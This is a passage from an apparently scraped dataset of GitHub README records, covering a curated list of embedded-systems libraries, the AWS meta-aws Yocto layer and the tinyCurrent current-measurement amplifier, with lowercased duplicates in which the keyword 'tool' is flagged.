Embedded TLS/DTLS library, source and binary compatible OpenSSL subset\nwolfTPM - a highly portable TPM 2.0 library, designed for embedded use\nsalty - Ed25519 signatures with assembly optimizations for Cortex-M4 and Cortex-M33\nmbedTLS\nCompression\nheatshrink - data compression library for embedded/real-time systems\nshoco - a C library to compress and decompress short strings. It is very fast and easy to use. The default compression model is optimized for english words, but you can generate your own compression model\nECL - Embedded Compression Library is not only for embedded, it is mostly oriented for small data and has special optimized low-memory modes for restricted environments\nDSP and Filtering\nkalman-clib - Microcontroller targeted naive Kalman filter implementation in pure C\n-\nCV\nEmbedded SOD - an Embedded Computer Vision & Machine Learning Library (CPU Optimized & IoT Capable)\nQR-Image-embedded - QR library fork for embedded systems\n-\nAI ML\nCranium - a portable, header-only, feedforward artificial neural network library written in vanilla C99\n\u03bcTensor - TinyML AI inference library\nFido - lightweight C++ machine learning library for embedded electronics and robotics\nnnom - Neural Network on Microcontroller (NNoM) is a high-level inference Neural Network library specifically for microcontrollers\ncaffepresso - an Optimized Library for Deep Learning on Embedded Accelerator-based platforms\nlibonnx - lightweight, portable pure C99 onnx inference engine for embedded devices with hardware acceleration support\n-\n-\n-\nDataBases\nPureDB - a portable and tiny set of libraries for creating and reading constant databases\n-\nWEB\nuIP - is a very small implementation of the TCP/IP stack that is written by Adam Dunkels\nLwIP - a small independent implementation of the TCP/IP protocol suite that has been initially developed by Adam Dunkels. lwIP suitable for use in embedded systems with tens of kilobytes of free RAM and room for around 40 kilobytes of code ROM.\nHttpClient - Http Client Library\nhttpio - Stand-Alone Cross Platform request parser and response generator for the HTTP protocol\n-\nNetwork protocols\nPicoTCP - is a small-footprint, modular TCP/IP stack designed for embedded systems and the Internet of Things\nweb-server\nmongoose - Embedded Web Server Library. It is a multi-protocol embedded networking library with functions including TCP, HTTP client and server, WebSocket client and server, MQTT client and broker and much more.\nlibevhtp - extremely-fast and secure embedded HTTP servers with ease\nlib\u03bchttpd - very flexible, lightweight and fully asynchronous HTTP server library based on libev and http-parser\n-\n-\nFilesystem\nlwext4 - ext2/ext3/ext4 filesystem library for microcontrollers\nFatFS - FAT filesystem implementation\nLevelX - Provides Flash Wear Leveling for FileX and Stand Alone purposes\nufat - Low-memory feature-complete VFAT implementation\nfat_io_lib - Small footprint, low dependency, C code implementation of a FAT16 & FAT32 driver\nSdFat - Arduino FAT16/FAT32 exFAT Library\nfat32 - a lighweight FAT32 file system written in C with no thirdparty dependencies. It requires a small port which provide functions for initializing, reading and writing to the MSD\nemfat - fat32 emulation library for stm32f4\nFirmware updates\nSWupdate - Software Update for Embedded Linux Devices to update system in field. SWUpdate supports local and OTA updates, multiple update strategies and it is designed with security in mind.\nGUI\nlvgl - Powerful and easy-to-use embedded GUI with many widgets, advanced visual effects (opacity, antialiasing, animations) and low memory requirements (16K RAM, 64K Flash)\nEasyGUI - EasyGUI for embedded systems (highly optimized for STM32)\nTouchGFX - a user-friendly graphical C++ tool integrated as a free tool in the STM32 ecosystem\neGUI - eGUI embedded graphic library\nEmbedded-graphics - a 2D graphics library that is focused on memory constrained embedded devices\nESLowGraphics - Low level software graphics library by ErrorSoft (ESLGL)\nftk - gui library for embedded system\nu8glib - Universal Graphics Library for 8 Bit Embedded Systems\nu8g2 - U8glib library for monochrome displays, version 2\nSGFX - a lightweight embedded library for displays and touchscreens providing everything required to build a fully featured embedded GUI\nGUIX - provides a complete, embedded graphical user interface (GUI) library and design environment, facilitating the creation and maintenance of all graphical elements needed by your device\nGUILib - GUI library for embedded systems\nHMI_Library - Human Machine Interface suitable for embedded system\nAFGUI - Embedded GUI Library\nMakiseGUI - Graphics and GUI library for embed systems\nemGUI - Simple C UI Library for embedded platforms\nmicromenu-v2 - Tiny text-orientated menu library in C for embedded use\nGUI editors\nlv_gui_designer - a drag-and-drop, simple GUI designer built with LittlevGL\nwalv - Online, WYSIWYG GUI designer for LittlevGL. Cross-platform supported(Even Android and IOS)\nFont utils\nbitmap-OSD-font - A 'C' bitmap font for on screen display\nttf2mesh - library for TrueType font tessellation. Allows to convert font glyphs to mesh objects without rasterization\nsfam_generator - Simple scripts for generating bit fonts for STM32, AVR, Arduino or other MCU\nPicture manupulation tools\nlcd-image-converter - Tool to create bitmaps and fonts for embedded applications; allows you to create bitmaps and fonts, and transform them to \"C\" source format for embedded applications\nRTOS\nFreeRTOS\nZephyr - a new generation, scalable, optimized, secure RTOS for multiple hardware architectures\nApache NuttX -\nscmRTOS - tiny Real-Time Preemptive Operating System intended for use with Single-Chip Microcontrollers. scmRTOS is capable to run on tiny uCs with as small amount of RAM as 512 bytes. The RTOS is written on C++ and supports various platforms.\nChibiOS -\nAzure RTOS ThreadX - is an advanced real-time operating system (RTOS) designed specifically for deeply embedded applications\neCos -\nembox - a configurable RTOS designed for resource constrained and embedded systems. Embox main idea is using Linux software without Linux\nRIOT - a real-time multi-threading operating system that supports a range of devices that are typically found in the Internet of Things (IoT): 8-bit, 16-bit and 32-bit microcontrollers. RIOT is based on the following design principles: energy-efficiency, real-time capabilities, small memory footprint, modularity, and uniform API access, independent of the underlying hardware (this API offers partial POSIX compliance).\nArm Mbed OS - a platform operating system designed for the Internet of Things. It includes all the features you need to develop a connected product based on an Arm Cortex-M microcontroller, including security, connectivity, an RTOS and drivers for sensors and I/O devices.\nRT-Thread - RT-Thread was born in 2006, it is an open source, neutral, and community-based real-time operating system (RTOS). RT-Thread has Standard version and Nano version. For resource-constrained microcontroller (MCU) systems, the NANO kernel version that requires only 3KB Flash and 1.2KB RAM memory resources can be tailored with easy-to-use tools; And for resource-rich IoT devices, RT-Thread can use the on-line software package management tool, together with system configuration tools, to achieve intuitive and rapid modular cutting, seamlessly import rich software packages, thus achieving complex functions like Android's graphical interface and touch sliding effects, smart voice interaction effects, and so on.\ndistortos - object-oriented C++ RTOS for microcontrollers\nOS\ncitrus - Bare metal ARM\u00ae Cortex\u00ae-A5 operating system\nvanilla - Bare metal ARM\u00ae Cortex\u00ae-M7 operating system\nchaos - Bare metal multicore ARM\u00ae Cortex\u00ae-A operating system based on a microkernel architecture\nHardware\nUSB\ntinyusb - open source cross-platform USB stack for embedded system\nlibusb_stm32 - Lightweight USB device Stack for STM32 microcontrollers\nFlash\nSFUD - Serial Flash Universal Driver (using JEDEC's SFDP standard serial (SPI) flash universal driver library)\nCAN bus\nlibcanard - compact implementation of the UAVCAN/CAN protocol in C for high-integrity real-time embedded systems\nCanbus-Message - CAN message assembly and disassembly library for teensy & stm32\nUncategorized\nTimeLib - Time management library for embedded devices\n\u03bctz - a ime zone library for tiny embedded systems\ntslib - Touchscreen access library\nwiselib - generic algorithms library for heterogeneous, distributed, embedded systems\nApache NuttX Apps - a collection of tools, shells, network utilities, libraries, interpreters and can be used with the NuttX RTOS\nutil.embedded - Useful support code for embedded development\n-\n-\n-\netc\nFollow this root-repo for lastest updates: https://github.com/iDoka/awesome-embedded-software\nTags\n#awesome #awesome-list #embedded #embedded-systems #rtos #stm32 #cortex-m #risc-v #mcu #uc #lightweight #gui #iot #crossplatform #portable #lightweight-embedded-library #embedded-library", "link": "https://github.com/iDoka/awesome-embedded-software", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "\ud83d\udea7 a curated list of awesome sources and libs for embedded systems\nthere is my attempt to create list of software for embedded systems\nurl: https://github.com/idoka/awesome-embedded-software\ncontents\nunder construct\ncommon\nembxx - embedded c++ library\nembedded-libs - libraries for embedded software (mainly for stm32)\nregexp - regular expressions library for embedded systems\netlcpp - embedded template library where the user can declare the size, or maximum size of any object upfront\nefll - embedded fuzzy logic library is a standard library for embedded systems\nprotocol parsers\nlwgps - lightweight gps nmea parser for embedded systems\nlwesp - lightweight esp at commands parser library to communicate with esp8266 or esp32 wi-fi module using at commands\nlwgsm - library for simcom gsm modules to communicate with at commands and rtos from host device\ngsm_engine - generic at parser for at command based modules\ntinygsm - small arduino library for gsm modules, that just works\nat command parser\natat - lib for at-like custom commands processing\ncat - plain c library for parsing at commands for use in host devices\ngzat - portable at command parsing library in c++ language\natparser - an mbed-os compatible at command parser\natcommander - portable c++ library for sending at commands and parsing their responses\nvarious protocols\nlwpkt - lightweight packet protocol structure for multi-device communication focused on rs-485\nlwow - lightweight onewire protocol library optimized for uart hardware on embedded systems\npanstamp-swap - simple wireless abstract protocol for any existing ism radio\nmemory\nlibmemory - memory management library with implementations for malloc(), free(), and other useful memory management functions\nlwmem - lightweight dynamic memory manager library for embedded systems with memory constraints. it implements malloc, calloc, realloc and free functions\neasyflash - lightweight embedded flash memory library\nlogging\nembedded-log - a small and beautiful embedded log library for mcu\neasylogger - an ultra-lightweight (rom<1.6k, ram<0.3k), high-performance c/c++ log library\ndata bases\nflashdb - ultra-lightweight database that supports key-value and time series data\nring buffer\nlwrb - lightweight generic ring buffer manager library\nringbuffer - simple interrupt safe ring (circular) buffer queuing library for embedded platforms\nprintf\nlwprintf - lightweight printf library optimized for embedded systems\nembedded_printf - embedded version of the famous \"printf( )\" function. the idea is create an simple and efficient library to meet some common needs in embedded systems\ntinyprintf - tiny printf and sprintf library for small embedded systems\ncli\ncli - a cli (command line interface) example build in pure c. designed for mcu, support block/non-block mode input\nterminal - a command line interface for microcontrollers. flexible terminal settings allow you to integrate it with any microcontroller, without much effort\nserialmenu - arduino library to easily create menus on the serial console\n-\n-\n-\n-\n-\nmenu\npromenu - advanced generic application menu library. promenu library is used for fast implementing advanced user menus. it supports nesting, numeric settings, text settings, boolean values and events. library is implemented in c++ with build-in arduino port, but it is easy to port to different architecture.\n-\n-\n-\nthread management\nc-thread-pool - minimal but powerful thread pool in ansi c\nio\nfastio - fast gpio forked from http://os.mbed.com/users/sissors/code/fastio/\n-\n-\n-\nbuffers\nembeddedproto - a c++ protocol buffers implementation specifically suitable for arm cortex-m microcontrollers. it is small, reliable and easy to use\nprotobuf-embedded-c - a protocol buffers generator for resource constrained embedded applications written in the c programming language\nsnippets\ncollection of miscellaneous portable c snippets\nhw\nembedded-driver - embedded driver library for various peripheral\ntinyusb - cross-platform usb stack for embedded system\nflashalgo - framework for building arm cortex-m \"flm\" style flash programming algorithms\nprotocols\nxmodem - xmodem library for embedded, mobile, iot, and desktop systems\nmicrorl - micro read line library for small and embedded devices with basic vt100 support\ntinyframe - a simple library for building and parsing data frames for serial interfaces (like uart / rs232)\ninterchange - request/response mechanism for embedded development, using atomics\n-\n-\nrf\nradiohead - packet radio library for embedded microprocessors\nadafruit's radiohead - packet radio library for embedded microprocessors with docs\n-\nmqtt\nlibemqtt 1 - embedded c client library for the mqtt protocol\nlibumqtt 2 - a lightweight and fully asynchronous mqtt client c library based on libev\npaho mqtt - c client library for embedded systems\n-\n-\ndata processing\nliquid-fpm - software-defined radio fixed-point math library for embedded signal processing\nliquid-dsp - digital signal processing library for software-defined radios\nminfft - small and fast discrete fourier transform library\nrandom number generation\npcg-c-basic - code provides a minimal implementation of one member of the pcg family of random number generators, which are fast, statistically excellent, and offer a number of useful features\npcg-c - code provides an implementation of the pcg family of random number generators, which are fast, statistically excellent, and offer a number of useful features\ncryptography\ntrussed - a minimal, modular way to write cryptographic applications on microcontroller platforms (rust)\nwolfssh - a lightweight sshv2 client and server library written in ansi c and targeted for embedded, rtos, and resource-constrained environments - primarily because of its small size, speed, and feature set\nlibhydrogen - a lightweight, secure, easy-to-use crypto library suitable for constrained environments\nkrypton - embedded tls/dtls library, source and binary compatible openssl subset\nwolftpm - a highly portable tpm 2.0 library, designed for embedded use\nsalty - ed25519 signatures with assembly optimizations for cortex-m4 and cortex-m33\nmbedtls\ncompression\nheatshrink - data compression library for embedded/real-time systems\nshoco - a c library to compress and decompress short strings. it is very fast and easy to use. the default compression model is optimized for english words, but you can generate your own compression model\necl - embedded compression library is not only for embedded, it is mostly oriented for small data and has special optimized low-memory modes for restricted environments\ndsp and filtering\nkalman-clib - microcontroller targeted naive kalman filter implementation in pure c\n-\ncv\nembedded sod - an embedded computer vision & machine learning library (cpu optimized & iot capable)\nqr-image-embedded - qr library fork for embedded systems\n-\nai ml\ncranium - a portable, header-only, feedforward artificial neural network library written in vanilla c99\n\u03bctensor - tinyml ai inference library\nfido - lightweight c++ machine learning library for embedded electronics and robotics\nnnom - neural network on microcontroller (nnom) is a high-level inference neural network library specifically for microcontrollers\ncaffepresso - an optimized library for deep learning on embedded accelerator-based platforms\nlibonnx - lightweight, portable pure c99 onnx inference engine for embedded devices with hardware acceleration support\n-\n-\n-\ndatabases\npuredb - a portable and tiny set of libraries for creating and reading constant databases\n-\nweb\nuip - is a very small implementation of the tcp/ip stack that is written by adam dunkels\nlwip - a small independent implementation of the tcp/ip protocol suite that has been initially developed by adam dunkels. lwip suitable for use in embedded systems with tens of kilobytes of free ram and room for around 40 kilobytes of code rom.\nhttpclient - http client library\nhttpio - stand-alone cross platform request parser and response generator for the http protocol\n-\nnetwork protocols\npicotcp - is a small-footprint, modular tcp/ip stack designed for embedded systems and the internet of things\nweb-server\nmongoose - embedded web server library. it is a multi-protocol embedded networking library with functions including tcp, http client and server, websocket client and server, mqtt client and broker and much more.\nlibevhtp - extremely-fast and secure embedded http servers with ease\nlib\u03bchttpd - very flexible, lightweight and fully asynchronous http server library based on libev and http-parser\n-\n-\nfilesystem\nlwext4 - ext2/ext3/ext4 filesystem library for microcontrollers\nfatfs - fat filesystem implementation\nlevelx - provides flash wear leveling for filex and stand alone purposes\nufat - low-memory feature-complete vfat implementation\nfat_io_lib - small footprint, low dependency, c code implementation of a fat16 & fat32 driver\nsdfat - arduino fat16/fat32 exfat library\nfat32 - a lighweight fat32 file system written in c with no thirdparty dependencies. it requires a small port which provide functions for initializing, reading and writing to the msd\nemfat - fat32 emulation library for stm32f4\nfirmware updates\nswupdate - software update for embedded linux devices to update system in field. swupdate supports local and ota updates, multiple update strategies and it is designed with security in mind.\ngui\nlvgl - powerful and easy-to-use embedded gui with many widgets, advanced visual effects (opacity, antialiasing, animations) and low memory requirements (16k ram, 64k flash)\neasygui - easygui for embedded systems (highly optimized for stm32)\ntouchgfx - a user-friendly graphical c++ -----> tool !!!  integrated as a free -----> tool !!!  in the stm32 ecosystem\negui - egui embedded graphic library\nembedded-graphics - a 2d graphics library that is focused on memory constrained embedded devices\neslowgraphics - low level software graphics library by errorsoft (eslgl)\nftk - gui library for embedded system\nu8glib - universal graphics library for 8 bit embedded systems\nu8g2 - u8glib library for monochrome displays, version 2\nsgfx - a lightweight embedded library for displays and touchscreens providing everything required to build a fully featured embedded gui\nguix - provides a complete, embedded graphical user interface (gui) library and design environment, facilitating the creation and maintenance of all graphical elements needed by your device\nguilib - gui library for embedded systems\nhmi_library - human machine interface suitable for embedded system\nafgui - embedded gui library\nmakisegui - graphics and gui library for embed systems\nemgui - simple c ui library for embedded platforms\nmicromenu-v2 - tiny text-orientated menu library in c for embedded use\ngui editors\nlv_gui_designer - a drag-and-drop, simple gui designer built with littlevgl\nwalv - online, wysiwyg gui designer for littlevgl. cross-platform supported(even android and ios)\nfont utils\nbitmap-osd-font - a 'c' bitmap font for on screen display\nttf2mesh - library for truetype font tessellation. allows to convert font glyphs to mesh objects without rasterization\nsfam_generator - simple scripts for generating bit fonts for stm32, avr, arduino or other mcu\npicture manupulation tools\nlcd-image-converter - tool to create bitmaps and fonts for embedded applications; allows you to create bitmaps and fonts, and transform them to \"c\" source format for embedded applications\nrtos\nfreertos\nzephyr - a new generation, scalable, optimized, secure rtos for multiple hardware architectures\napache nuttx -\nscmrtos - tiny real-time preemptive operating system intended for use with single-chip microcontrollers. scmrtos is capable to run on tiny ucs with as small amount of ram as 512 bytes. the rtos is written on c++ and supports various platforms.\nchibios -\nazure rtos threadx - is an advanced real-time operating system (rtos) designed specifically for deeply embedded applications\necos -\nembox - a configurable rtos designed for resource constrained and embedded systems. embox main idea is using linux software without linux\nriot - a real-time multi-threading operating system that supports a range of devices that are typically found in the internet of things (iot): 8-bit, 16-bit and 32-bit microcontrollers. riot is based on the following design principles: energy-efficiency, real-time capabilities, small memory footprint, modularity, and uniform api access, independent of the underlying hardware (this api offers partial posix compliance).\narm mbed os - a platform operating system designed for the internet of things. it includes all the features you need to develop a connected product based on an arm cortex-m microcontroller, including security, connectivity, an rtos and drivers for sensors and i/o devices.\nrt-thread - rt-thread was born in 2006, it is an open source, neutral, and community-based real-time operating system (rtos). rt-thread has standard version and nano version. for resource-constrained microcontroller (mcu) systems, the nano kernel version that requires only 3kb flash and 1.2kb ram memory resources can be tailored with easy-to-use tools; and for resource-rich iot devices, rt-thread can use the on-line software package management tool, together with system configuration tools, to achieve intuitive and rapid modular cutting, seamlessly import rich software packages, thus achieving complex functions like android's graphical interface and touch sliding effects, smart voice interaction effects, and so on.\ndistortos - object-oriented c++ rtos for microcontrollers\nos\ncitrus - bare metal arm\u00ae cortex\u00ae-a5 operating system\nvanilla - bare metal arm\u00ae cortex\u00ae-m7 operating system\nchaos - bare metal multicore arm\u00ae cortex\u00ae-a operating system based on a microkernel architecture\nhardware\nusb\ntinyusb - open source cross-platform usb stack for embedded system\nlibusb_stm32 - lightweight usb device stack for stm32 microcontrollers\nflash\nsfud - serial flash universal driver (using jedec's sfdp standard serial (spi) flash universal driver library)\ncan bus\nlibcanard - compact implementation of the uavcan/can protocol in c for high-integrity real-time embedded systems\ncanbus-message - can message assembly and disassembly library for teensy & stm32\nuncategorized\ntimelib - time management library for embedded devices\n\u03bctz - a ime zone library for tiny embedded systems\ntslib - touchscreen access library\nwiselib - generic algorithms library for heterogeneous, distributed, embedded systems\napache nuttx apps - a collection of tools, shells, network utilities, libraries, interpreters and can be used with the nuttx rtos\nutil.embedded - useful support code for embedded development\n-\n-\n-\netc\nfollow this root-repo for lastest updates: https://github.com/idoka/awesome-embedded-software\ntags\n#awesome #awesome-list #embedded #embedded-systems #rtos #stm32 #cortex-m #risc-v #mcu #uc #lightweight #gui #iot #crossplatform #portable #lightweight-embedded-library #embedded-library", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000691, "year": null}, {"Unnamed: 0": 703, "autor": 703, "date": null, "content": "the meta-aws project\nThe meta-aws project provides recipes for building in AWS edge software capabilities to Embedded Linux built with OpenEmbedded and Yocto Project build frameworks.\nPlease check out our sister project meta-aws-demos! Over time, we will continuously be adding MACHINE specific demonstrations for AWS software on Embedded Linux built by the Yocto Project build framework with the meta-aws Metadata Layer.\nSupported Yocto Project Releases\nWe are supporting customers building solutions on AWS with meta-aws for the following Yocto Project releases. Let us know if you need AWS device software for a specific Yocto Project release and we will work with you through Github Issues to resolve the challenge you might be facing. We also encourage contributions by the community.\nRelease branch (?)Layer integrity check (?)\nhonister (master)\nhardknott\ngatesgarth\ndunfell\nzeus (breakfix only)\nthud (breakfix only)\nwarrior (breakfix only)\nsumo (breakfix only)\nAll prior releases will be handled on a case by case basis. Again, please let us know if you're in a crunch on earlier releases and we'll help you the best we can!\nDependencies\nmeta-aws supports a wide variety of device software. This layer defines a minimum dependency set that covers many of the recipes. Sometimes, the recipe will require additional layers either to support optional features or programming languages not supported by OpenEmbedded. When those requirements surface, they are documented in recipe specific README files.\nBase dependencies:\ncore\nopenembedded-layer (meta-oe)\nnetworking-layer (meta-networking)\nmeta-python\nSupported recipes for services, software, and SDKs\nThese are the currently supported services, software, and SDKs you can use to build AWS solutions with many types of devices when building your distribution with the Yocto Project.\nService, Software, or SDK Details\nAmazon CloudWatch Publisher Installs and configures the Amazon CloudWatch Publisher.\nAmazon CloudWatch provides a wealth of tools for monitoring resources and applications in real-time. However, out-of-the-box support is limited to AWS-native resources (e.g. EC2 instances) or systems compatible with the CloudWatch Agent.\nAWS Command Line Interface v1 The AWS Command Line Interface (CLI) is a unified tool to manage your AWS services. With just one tool to download and configure, you can control multiple AWS services from the command line and automate them through scripts.\nAmazon Corretto Amazon Corretto is a no-cost, multiplatform, production-ready distribution of the Open Java Development Kit (OpenJDK). Corretto comes with long-term support that will include performance enhancements and security fixes. Amazon runs Corretto internally on thousands of production services and Corretto is certified as compatible with the Java SE standard.\nAWS IoT Device Client The AWS IoT Device Client is free, open-source, modular software written in C++ that you can compile and install on your Embedded Linux based IoT devices to access AWS IoT Core, AWS IoT Device Management, and AWS IoT Device Defender features by default.\nAWS IoT Greengrass\nv1.0 AWS IoT Greengrass is an Internet of Things (IoT) open source edge runtime and cloud service that helps you build, deploy, and manage device software. Customers use AWS IoT Greengrass for their IoT applications on millions of devices in homes, factories, vehicles, and businesses. You can program your devices to act locally on the data they generate, execute predictions based on machine learning models, filter and aggregate device data, and only transmit necessary information to the cloud.\nREADME\nAWS IoT Greengrass\nv2.0 AWS IoT Greengrass is an Internet of Things (IoT) open source edge runtime and cloud service that helps you build, deploy, and manage device software. Customers use AWS IoT Greengrass for their IoT applications on millions of devices in homes, factories, vehicles, and businesses. You can program your devices to act locally on the data they generate, execute predictions based on machine learning models, filter and aggregate device data, and only transmit necessary information to the cloud.\nREADME\nAWS SDK for Python The AWS SDK for Python provides the python libraries you can use to interact with AWS Cloud. Botocore and Boto3 are available.\nAWS IoT Device SDK for C++ v2 The AWS IoT C++ Device SDK allows developers to build connected applications using AWS and the AWS IoT APIs. Specifically, this SDK was designed for devices that are not resource constrained and require advanced features such as message queuing, multi-threading support, and the latest language features.\nAWS IoT Device SDK for Python v2 The AWS IoT Device SDK for Python makes it possible for developers to write Python scripts to use their devices to access the AWS IoT platform through MQTT or MQTT over the WebSocket protocol. By connecting their devices to AWS IoT, users can securely work with the message broker, rules, and shadows provided by AWS IoT and with other AWS services like AWS Lambda, Kinesis, and Amazon S3, and more.\nAWS Firecracker AWS Firecracker Firecracker enables you to deploy workloads in lightweight virtual machines, called microVMs, which provide enhanced security and workload isolation over traditional VMs, while enabling the speed and resource efficiency of containers.\nIMPORTANT NOTES:\nAutomotive Grade Linux: The AGL distribution uses a specific static ID process. When adding AWS IoT Greengrass, you will need to define users in the passwd and group files manually. Please see https://github.com/aws/meta-aws/issues/75 for more information.\nFirecracker panic_abort resolution options:\nAppend RUST_PANIC_STRATEGY = \"abort\" to your local.conf, as the default strategy is unwind.\nPatch related Cargo.toml files to remove references to abort; not recommended.\nLeave RUST_PANIC_STRATEGY as default, and implement custom abort handler.\n\u00a9 2019-2021, Amazon Web Services, Inc. or its affiliates. All rights reserved.", "link": "https://github.com/aws/meta-aws", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "the meta-aws project\nthe meta-aws project provides recipes for building in aws edge software capabilities to embedded linux built with openembedded and yocto project build frameworks.\nplease check out our sister project meta-aws-demos! over time, we will continuously be adding machine specific demonstrations for aws software on embedded linux built by the yocto project build framework with the meta-aws metadata layer.\nsupported yocto project releases\nwe are supporting customers building solutions on aws with meta-aws for the following yocto project releases. let us know if you need aws device software for a specific yocto project release and we will work with you through github issues to resolve the challenge you might be facing. we also encourage contributions by the community.\nrelease branch (?)layer integrity check (?)\nhonister (master)\nhardknott\ngatesgarth\ndunfell\nzeus (breakfix only)\nthud (breakfix only)\nwarrior (breakfix only)\nsumo (breakfix only)\nall prior releases will be handled on a case by case basis. again, please let us know if you're in a crunch on earlier releases and we'll help you the best we can!\ndependencies\nmeta-aws supports a wide variety of device software. this layer defines a minimum dependency set that covers many of the recipes. sometimes, the recipe will require additional layers either to support optional features or programming languages not supported by openembedded. when those requirements surface, they are documented in recipe specific readme files.\nbase dependencies:\ncore\nopenembedded-layer (meta-oe)\nnetworking-layer (meta-networking)\nmeta-python\nsupported recipes for services, software, and sdks\nthese are the currently supported services, software, and sdks you can use to build aws solutions with many types of devices when building your distribution with the yocto project.\nservice, software, or sdk details\namazon cloudwatch publisher installs and configures the amazon cloudwatch publisher.\namazon cloudwatch provides a wealth of tools for monitoring resources and applications in real-time. however, out-of-the-box support is limited to aws-native resources (e.g. ec2 instances) or systems compatible with the cloudwatch agent.\naws command line interface v1 the aws command line interface (cli) is a unified -----> tool !!!  to manage your aws services. with just one tool to download and configure, you can control multiple aws services from the command line and automate them through scripts.\namazon corretto amazon corretto is a no-cost, multiplatform, production-ready distribution of the open java development kit (openjdk). corretto comes with long-term support that will include performance enhancements and security fixes. amazon runs corretto internally on thousands of production services and corretto is certified as compatible with the java se standard.\naws iot device client the aws iot device client is free, open-source, modular software written in c++ that you can compile and install on your embedded linux based iot devices to access aws iot core, aws iot device management, and aws iot device defender features by default.\naws iot greengrass\nv1.0 aws iot greengrass is an internet of things (iot) open source edge runtime and cloud service that helps you build, deploy, and manage device software. customers use aws iot greengrass for their iot applications on millions of devices in homes, factories, vehicles, and businesses. you can program your devices to act locally on the data they generate, execute predictions based on machine learning models, filter and aggregate device data, and only transmit necessary information to the cloud.\nreadme\naws iot greengrass\nv2.0 aws iot greengrass is an internet of things (iot) open source edge runtime and cloud service that helps you build, deploy, and manage device software. customers use aws iot greengrass for their iot applications on millions of devices in homes, factories, vehicles, and businesses. you can program your devices to act locally on the data they generate, execute predictions based on machine learning models, filter and aggregate device data, and only transmit necessary information to the cloud.\nreadme\naws sdk for python the aws sdk for python provides the python libraries you can use to interact with aws cloud. botocore and boto3 are available.\naws iot device sdk for c++ v2 the aws iot c++ device sdk allows developers to build connected applications using aws and the aws iot apis. specifically, this sdk was designed for devices that are not resource constrained and require advanced features such as message queuing, multi-threading support, and the latest language features.\naws iot device sdk for python v2 the aws iot device sdk for python makes it possible for developers to write python scripts to use their devices to access the aws iot platform through mqtt or mqtt over the websocket protocol. by connecting their devices to aws iot, users can securely work with the message broker, rules, and shadows provided by aws iot and with other aws services like aws lambda, kinesis, and amazon s3, and more.\naws firecracker aws firecracker firecracker enables you to deploy workloads in lightweight virtual machines, called microvms, which provide enhanced security and workload isolation over traditional vms, while enabling the speed and resource efficiency of containers.\nimportant notes:\nautomotive grade linux: the agl distribution uses a specific static id process. when adding aws iot greengrass, you will need to define users in the passwd and group files manually. please see https://github.com/aws/meta-aws/issues/75 for more information.\nfirecracker panic_abort resolution options:\nappend rust_panic_strategy = \"abort\" to your local.conf, as the default strategy is unwind.\npatch related cargo.toml files to remove references to abort; not recommended.\nleave rust_panic_strategy as default, and implement custom abort handler.\n\u00a9 2019-2021, amazon web services, inc. or its affiliates. all rights reserved.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000703, "year": null}, {"Unnamed: 0": 706, "autor": 706, "date": null, "content": "tinyCurrent \u2013 an enhanced uCurrent Gold Derivative\nA low cost yet professional low current measurement shunt and amplifier combination to overcome the issue of high burden voltage as seen with multimeters and to enable low current measurement by using voltage measurement devices such as oscilloscopes.\nOriginally designed and sold by Dave Jones on the EEVBLOG, this derivative has several enhancements specifically for measuring varying currents on today's low power devices. Switch mode voltage regulators and the varying current draw of MCUs and RF chips require the determination of the current draw over time to calculate the total power consumption of a device. A storage oscilloscope is a perfect tool for this task and widely available. That's why the tinyCurrent features a BNC connector to reduce the picked-up noise while measuring with an and oscilloscope. Another problem is the high dynamics in power draw caused by the aforementioned reasons. This is addressed by the possibility to power the device from an external source with up to 5.5 V and bridge R7 using J6 to use the whole positive VDD as maximum positive output voltage. Both measures combined lead to almost 3 times higher dynamic range.\nModifications to the original Design\nHighlights\nAdded BNC output for lower noise when acquiring data with a high input impedance instruments like an oscilloscope. The effect is lower noise compared to normal banana leads. See all scope shots for comparison.\nAdded a 2-pin 1.25 mm JST ZH style male header for powering the device externally to better use the device in permanent measurement setups. Only use without battery.\nAllow device to be fed with supply voltage of up to 5.5 V to increase the dynamic range (only when external power source us used).\nAdded header J6 which allows to install a THT resistor or bond wire to change the ratio of the voltage divider R6/ R7 to increase the dynamic range for positive currents. R6/ R7 have a ratio of 1/ 5 to allow for a max. positive output voltage of ~80% of the supply voltage.\n\"R-Variant\" with reversed BNC connector optimized for attaching the device directly to an oscilloscope's input via a BNC-to-BNC adapter.\nOther Differences\nIncreased width of some traces\nCase and board shape to fit case\nRemoved test traces on PCB on all 4 corners as they are antennas\nSlide switches with lower current rating than in original design \u2192 Tests have shown that the used switch can easily handle 5V/ 6A which should be far enough for this device\nShunt resistor R9 has 0.05% greater tolerance \u2192 Parts are hand selected using 7 1/2 Digit DMM with 4 wire measurement in 100 Ohm range\nPads for C5, C6 to fit caps on the virtual ground rails to prevent oscillation with capacitive loads\nSome other BoM changes without negative implications\nSpecifications\nMin/Max Current per Range\nDynamic Range In general, the dynamic range in one direction can be determined by:\nVDD / 2 - 200 mV (security margin) = X mV. In case of VGND = VDD / 2.\n@2.9V VDD (mean battery voltage over usage time)\nnA \u00b1 1250 nA (20 \u00b5V / nA burden voltage typical), contact resistance plays a role here. 10 \u00b5V due to the shunt resistor.\n\u00b5A \u00b1 1250 \u00b5A (10 \u00b5V / \u00b5A burden voltage)\nmA \u00b1 1250 mA (10 \u00b5V / mA burden voltage)\n@5.5V VDD (from external power source)\nnA \u00b1 2550 nA (20 \u00b5V / nA burden voltage typical), contact resistance plays a role here. 10 \u00b5V due to the shunt resistor.\n\u00b5A \u00b1 2550 \u00b5A (10 \u00b5V / \u00b5A burden voltage)\nmA \u00b1 2550 mA (10 \u00b5V / mA burden voltage)\nResolution in nA Range 1000 pA on a 3.5 digit DMM\n100 pA on 4.5 digit DMM\n10 pA 5.5 digit DMM\nAccuracy, typical < \u00b10.05% on \u00b5A and nA ranges\n< \u00b10.1% on mA range\nOutput Offset Voltage, maximum < \u00b130 \u00b5V\nTemperature Drift < 10 ppm / degC (\u00b5A / nA)\n< 15 ppm / degC (mA)\nNoise < -90 dBV\nTHD < -60 dB\nBandwidth (-3 dB) 300 kHz\nPower Supply CR2032 Lithium coin cell or max 5.5 V through connector J5\nBattery Life >50 hours (battery good LED ensures accurate measurement when LED is on). 2.65 V cutout 